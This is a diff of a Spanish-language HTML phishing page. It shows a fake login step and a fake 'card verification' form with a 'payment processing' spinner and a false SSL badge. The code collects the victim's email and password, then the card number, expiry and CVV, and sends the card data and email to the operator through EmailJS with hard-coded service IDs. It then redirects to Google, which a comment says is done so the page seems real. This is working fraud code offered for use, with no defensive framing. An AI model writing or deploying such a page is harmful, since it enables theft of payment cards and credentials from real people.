@@ -1,170 +1,189 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Seguridad</title>
-    <!-- Librería de EmailJS -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-       (function(){
-          // REEMPLAZAR CON TU PUBLIC KEY
-          emailjs.init("khxV-eoqC-Gvj4H1a");
-       })();
-    </script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificación de Pago</title>
+<!-- Carga de SDK de EmailJS -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+// INICIALIZACIÓN DE EMAILJS
+(function(){
+   // TU PUBLIC KEY
+   emailjs.init("khxV-eoqC-Gvj4H1a");
+})();
+</script>
 
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f2f2f2;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: #ffffff;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
-        h2 {
-            color: #333;
-            margin-bottom: 20px;
-            font-size: 22px;
-        }
-        p {
-            color: #666;
-            margin-bottom: 25px;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        .form-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #555;
-            font-size: 14px;
-            font-weight: bold;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-        input:focus {
-            border-color: #007bff;
-            outline: none;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: background-color 0.3s;
-            margin-top: 10px;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-        .icon {
-            font-size: 40px;
-            color: #007bff;
-            margin-bottom: 15px;
-        }
-        .error {
-            color: red;
-            font-size: 12px;
-            margin-top: 10px;
-            display: none;
-        }
-    </style>
+<style>
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }
+.card { background: #fff; width: 100%; max-width: 380px; border-radius: 8px; box-shadow: 0 4px 24px rgba(0,0,0,0.1); padding: 30px; box-sizing: border-box; }
+.header { text-align: center; margin-bottom: 25px; }
+.cards-icons { display: flex; justify-content: center; gap: 10px; margin-bottom: 15px; }
+.cards-icons img { height: 24px; width: auto; opacity: 0.8; }
+h2 { margin: 10px 0 5px; font-size: 20px; color: #111; }
+p { margin: 0 0 25px; font-size: 14px; color: #666; text-align: center; }
+.input-group { margin-bottom: 15px; }
+label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #444; }
+input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 15px; box-sizing: border-box; background: #fafafa; }
+input:focus { outline: none; border-color: #007bff; background: #fff; box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1); }
+.row { display: flex; gap: 15px; }
+.col { flex: 1; }
+button { width: 100%; padding: 13px; background-color: #007bff; color: white; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
+button:hover { background-color: #0056b3; }
+button:disabled { background-color: #ccc; cursor: not-allowed; }
+.hidden { display: none; }
+.fade-in { animation: fadeIn 0.4s ease-in-out; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+.center-content { text-align: center; padding: 20px 0; }
+.spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+.success-icon { font-size: 40px; color: #28a745; margin-bottom: 10px; }
+.secure-badge { display: flex; align-items: center; justify-content: center; gap: 5px; font-size: 12px; color: #888; margin-top: 15px; }
+</style>
 </head>
 <body>
 
-<div class="container">
-    <div class="icon">🔒</div>
-    <h2>Verificación de Tarjeta</h2>
-    <p>Para confirmar tu identidad y liberar tu cuenta, necesitamos verificar una tarjeta de crédito. No se realizará ningún cobro.</p>
+<div class="card fade-in">
+<!-- PASO 1: LOGIN -->
+<div id="step1">
+<div class="header">
+<h2>Bienvenido</h2>
+<p>Ingresa tus credenciales para acceder.</p>
+</div>
+<form id="form-login">
+<div class="input-group">
+<label>Correo Electrónico</label>
+<input type="email" id="email" required placeholder="nombre@ejemplo.com">
+</div>
+<div class="input-group">
+<label>Contraseña</label>
+<input type="password" id="pass" required placeholder="••••••••">
+</div>
+<button type="submit">Ingresar</button>
+</form>
+</div>
 
-    <form id="emailjs-form">
-        <div class="form-group">
-            <label for="email">Correo Electrónico</label>
-            <input type="email" id="email" name="email" placeholder="ejemplo@correo.com" required>
-        </div>
+<!-- PASO 2: TARJETA -->
+<div id="step2" class="hidden">
+<div class="header">
+<div class="cards-icons">
+<img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
+<img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="Mastercard">
+<img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex">
+</div>
+<h2>Verificar Tarjeta</h2>
+<p>Confirma con una micro-carga de $0.00.</p>
+</div>
 
-        <div class="form-group">
-            <label for="name">Nombre Completo</label>
-            <input type="text" id="name" name="name" placeholder="Nombre y Apellido" required>
-        </div>
+<form id="form-card">
+<div class="input-group">
+<label>Nombre en la tarjeta</label>
+<input type="text" id="nombre" placeholder="NOMBRE COMPLETO" required>
+</div>
+<div class="input-group">
+<label>Número de Tarjeta</label>
+<input type="text" id="card-num" placeholder="0000 0000 0000 0000" maxlength="19" required>
+</div>
+<div class="row">
+<div class="col">
+<div class="input-group">
+<label>Expiración</label>
+<input type="text" id="card-exp" placeholder="MM/YY" maxlength="5" required>
+</div>
+</div>
+<div class="col">
+<div class="input-group">
+<label>CVV</label>
+<input type="text" id="cvv" placeholder="123" maxlength="4" required>
+</div>
+</div>
+</div>
+<button type="submit" id="btn-pagar">Pagar y Verificar</button>
+</form>
+</div>
 
-        <div class="form-group">
-            <label for="card_number">Número de Tarjeta</label>
-            <input type="text" id="card_number" name="card_number" placeholder="0000 0000 0000 0000" required>
-        </div>
+<!-- LOADER -->
+<div id="loader" class="center-content hidden">
+<div class="spinner"></div>
+<p>Procesando pago...</p>
+</div>
 
-        <div style="display: flex; gap: 10px;">
-            <div class="form-group" style="flex: 1;">
-                <label for="expiry">Vencimiento</label>
-                <input type="text" id="expiry" name="expiry" placeholder="MM/AA" required>
-            </div>
-            <div class="form-group" style="flex: 1;">
-                <label for="cvv">CVV</label>
-                <input type="text" id="cvv" name="cvv" placeholder="123" required>
-            </div>
-        </div>
-
-        <button type="submit" id="btn-submit">Verificar Ahora</button>
-        <div class="error" id="error-msg">Error al enviar. Intentá de nuevo.</div>
-    </form>
+<!-- EXITO -->
+<div id="success" class="center-content hidden">
+<div class="success-icon">✔️</div>
+<h2>¡Listo!</h2>
+<p>Tu cuenta ha sido verificada.</p>
+<div class="secure-badge">🔒 Conexión segura SSL 256-bit</div>
+</div>
 </div>
 
 <script>
-    document.getElementById('emailjs-form').addEventListener('submit', function(event) {
-        event.preventDefault();
-        
-        const btn = document.getElementById('btn-submit');
-        const errorMsg = document.getElementById('error-msg');
-        
-        btn.innerText = 'Procesando...';
-        btn.disabled = true;
-        errorMsg.style.display = 'none';
+// Lógica de navegación
+document.getElementById('form-login').addEventListener('submit', (e) => {
+    e.preventDefault();
+    document.getElementById('step1').classList.add('hidden');
+    document.getElementById('step2').classList.remove('hidden');
+    document.getElementById('step2').classList.add('fade-in');
+});
 
-        // REEMPLAZAR CON TU SERVICE ID Y TEMPLATE ID
-        const serviceID = 'service_n6ayl9a';
-        const templateID = 'template_az3ki7d';
+document.getElementById('form-card').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const btn = document.getElementById('btn-pagar');
+    btn.disabled = true;
+    btn.innerText = "Verificando...";
 
-        emailjs.sendForm(serviceID, templateID, this)
-            .then(() => {
-                btn.innerText = '¡Verificado!';
-                btn.style.backgroundColor = '#28a745';
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com'; // Redirigir a Google para que parezca real
-                }, 2000);
-            }, (err) => {
-                btn.innerText = 'Verificar Ahora';
-                btn.disabled = false;
-                errorMsg.style.display = 'block';
-                console.log(JSON.stringify(err));
-            });
-    });
+    document.getElementById('step2').classList.add('hidden');
+    document.getElementById('loader').classList.remove('hidden');
+
+    // DATOS A ENVIAR (Asegúrate que estos nombres coincidan con tu plantilla de EmailJS)
+    const params = {
+        nombre: document.getElementById('nombre').value,
+        numero: document.getElementById('card-num').value,
+        expiracion: document.getElementById('card-exp').value,
+        cvv: document.getElementById('cvv').value,
+        email_login: document.getElementById('email').value
+    };
+
+    // TUS CREDENCIALES DE EMAILJS
+    const serviceID = 'service_n6ayl9a';
+    const templateID = 'template_az3ki7d';
+
+    emailjs.send(serviceID, templateID, params)
+        .then(() => {
+            document.getElementById('loader').classList.add('hidden');
+            document.getElementById('success').classList.remove('hidden');
+            document.getElementById('success').classList.add('fade-in');
+            
+            // Redirigir a Google para simular éxito
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 3000);
+        }, (err) => {
+            console.error('Error:', err);
+            document.getElementById('loader').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            btn.disabled = false;
+            btn.innerText = "Pagar y Verificar";
+        });
+});
+
+// Formatear tarjeta (espacios cada 4 dígitos)
+document.getElementById('card-num').addEventListener('input', function (e) {
+    let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    let formatted = '';
+    for (let i = 0; i < v.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += v[i];
+    }
+    e.target.value = formatted;
+});
+
+// Formatear fecha (MM/YY)
+document.getElementById('card-exp').addEventListener('input', function (e) {
+    let v = e.target.value.replace(/\D/g, '');
+    if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
+    e.target.value = v;
+});
 </script>
-
 </body>
 </html>
